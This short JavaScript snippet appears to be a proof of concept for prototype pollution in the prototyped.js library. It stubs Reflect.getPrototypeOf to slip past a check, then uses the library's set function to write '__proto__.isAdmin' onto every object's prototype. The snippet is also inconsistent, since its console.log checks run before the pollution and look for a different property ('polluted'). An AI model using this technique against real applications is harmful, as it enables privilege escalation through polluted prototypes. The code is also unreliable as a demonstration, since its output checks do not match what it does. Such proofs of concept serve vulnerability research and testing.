Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
console.log({}.polluted);
const set = require('prototyped.js/dist/object/set').default;
set({}, '__proto__.isAdmin', true);